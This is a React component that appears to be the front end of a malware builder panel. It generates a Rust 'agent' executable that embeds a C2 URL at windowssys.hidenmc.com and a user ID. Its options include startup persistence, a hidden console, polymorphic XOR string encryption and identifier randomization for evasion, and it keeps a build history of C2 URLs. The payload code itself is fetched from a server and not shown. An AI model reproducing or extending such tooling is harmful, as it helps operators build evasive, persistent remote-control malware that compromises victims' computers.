import { useState, useEffect } from "react";
import { hcApi } from "@/lib/hc-api";

export function HCBuilder() {
  const [buildName, setBuildName] = useState("hidencloud-agent");
  const [startup, setStartup] = useState(false);
  const [debug, setDebug] = useState(false);
  const [polyEncrypt, setPolyEncrypt] = useState(false);
  const [stringRandom, setStringRandom] = useState(false);
  const [lines, setLines] = useState<{ text: string; type: string }[]>([]);
  const [building, setBuilding] = useState(false);
  const [builds, setBuilds] = useState<any[]>([]);

  useEffect(() => {
    hcApi.builds().then(setBuilds).catch(() => {});
  }, []);

  async function handleBuild() {
    setBuilding(true);
    setLines([]);

    const steps = [
      "Initializing Rust project…",
      "Writing src/main.rs…",
      startup ? "Including persistence module…" : "Skipping persistence…",
      polyEncrypt ? "Applying polymorphic XOR encryption…" : "No encryption layer",
      stringRandom ? "Randomizing variable names & strings…" : "Using standard identifiers",
      "Writing Cargo.toml…",
      debug ? "Debug mode — console output active" : "Release mode — console hidden",
      "Embedding C2 URL (auto-detected user ID)…",
    ];

    for (const s of steps) {
      await new Promise(r => setTimeout(r, 200));
      setLines(prev => [...prev, { text: "▸ " + s, type: "normal" }]);
    }

    try {
      const res = await hcApi.build({ buildName, startup, debug, polyEncrypt, stringRandom });
      setLines(prev => [...prev, { text: `✓ Build "${buildName}" ready — ${res.c2Url}`, type: "ok" }]);

      const dl = (content: string, filename: string) => {
        const blob = new Blob([content], { type: "text/plain" });
        const a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = filename;
        a.click();
      };

      dl(res.contents, "main.rs");
      if (res.cargoContents) dl(res.cargoContents, "Cargo.toml");
      if (res.persistenceContents) dl(res.persistenceContents, "persistence.rs");

      setLines(prev => [...prev, { text: "Files downloaded. Place in src/ → cargo build --release", type: "normal" }]);

      // Refresh build history
      hcApi.builds().then(setBuilds).catch(() => {});
    } catch (err) {
      setLines(prev => [...prev, { text: "✗ " + (err instanceof Error ? err.message : "Build failed"), type: "err" }]);
    } finally {
      setBuilding(false);
    }
  }

  return (
    <div>
      <h1>Builder</h1>
      <p className="hc-sub">Generate a Rust agent. C2 URL and user ID are auto-detected.</p>
      <div className="hc-builder-layout">
        <div className="hc-card">
          <h3 className="hc-section-title">Build Configuration</h3>
          <label>Build Name</label>
          <input value={buildName} onChange={e => setBuildName(e.target.value)} placeholder="Build name" />

          <div className="hc-toggle-row">
            <span>Enable Startup</span>
            <label className="hc-toggle">
              <input type="checkbox" checked={startup} onChange={e => setStartup(e.target.checked)} />
              <span className="hc-toggle-slider" />
            </label>
          </div>
          <div className="hc-toggle-row">
            <span>Enable Debug</span>
            <label className="hc-toggle">
              <input type="checkbox" checked={debug} onChange={e => setDebug(e.target.checked)} />
              <span className="hc-toggle-slider" />
            </label>
          </div>

          <h3 className="hc-section-title" style={{ marginTop: 16 }}>Obfuscation</h3>
          <div className="hc-toggle-row">
            <div>
              <span>Polymorphic Encryption</span>
              <div className="hc-muted" style={{ fontSize: 11 }}>XOR-encrypt strings with random key each build</div>
            </div>
            <label className="hc-toggle">
              <input type="checkbox" checked={polyEncrypt} onChange={e => setPolyEncrypt(e.target.checked)} />
              <span className="hc-toggle-slider" />
            </label>
          </div>
          <div className="hc-toggle-row">
            <div>
              <span>String Randomizer</span>
              <div className="hc-muted" style={{ fontSize: 11 }}>Randomize variable names, function names & constants</div>
            </div>
            <label className="hc-toggle">
              <input type="checkbox" checked={stringRandom} onChange={e => setStringRandom(e.target.checked)} />
              <span className="hc-toggle-slider" />
            </label>
          </div>
        </div>

        <div className="hc-card">
          <div className="hc-preview-header">
            <div className="hc-preview-icon">⚡</div>
            <div>
              <div className="hc-mono" style={{ fontWeight: 600 }}>{buildName || "hidencloud-agent"}.exe</div>
              <div className="hc-muted" style={{ fontSize: 11 }}>windowssys.hidenmc.com/&lt;auto&gt;</div>
            </div>
          </div>
          <div className="hc-preview-stats">
            <div><span>Language</span><strong>Rust</strong></div>
            <div><span>Format</span><strong>EXE</strong></div>
            <div><span>Startup</span><strong>{startup ? "Enabled" : "Off"}</strong></div>
            <div><span>Debug</span><strong>{debug ? "On" : "Off"}</strong></div>
            <div><span>Poly Encrypt</span><strong>{polyEncrypt ? "On" : "Off"}</strong></div>
            <div><span>String RNG</span><strong>{stringRandom ? "On" : "Off"}</strong></div>
          </div>
          <div className="hc-build-log">
            {lines.length === 0 && <div className="hc-muted">Ready. Press Create Build to generate.</div>}
            {lines.map((l, i) => (
              <div key={i} className={`hc-build-line ${l.type}`}>{l.text}</div>
            ))}
          </div>
          <button className="hc-primary hc-build-btn" onClick={handleBuild} disabled={building}>
            {building ? "Building…" : "Create Build"}
          </button>
        </div>
      </div>

      {builds.length > 0 && (
        <>
          <h2>Build History</h2>
          <div className="hc-card">
            <table className="hc-table">
              <thead>
                <tr><th>Name</th><th>Startup</th><th>Debug</th><th>Poly</th><th>RNG</th><th>C2</th><th>Date</th></tr>
              </thead>
              <tbody>
                {builds.map(b => (
                  <tr key={b.id}>
                    <td>{b.name}</td>
                    <td>{b.startup ? "✅" : "❌"}</td>
                    <td>{b.debug ? "✅" : "❌"}</td>
                    <td>{b.polyEncrypt ? "✅" : "❌"}</td>
                    <td>{b.stringRandom ? "✅" : "❌"}</td>
                    <td className="hc-mono" style={{ fontSize: 11 }}>{b.c2Url}</td>
                    <td className="hc-muted">{new Date(b.createdAt).toLocaleDateString()}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </>
      )}
    </div>
  );
}
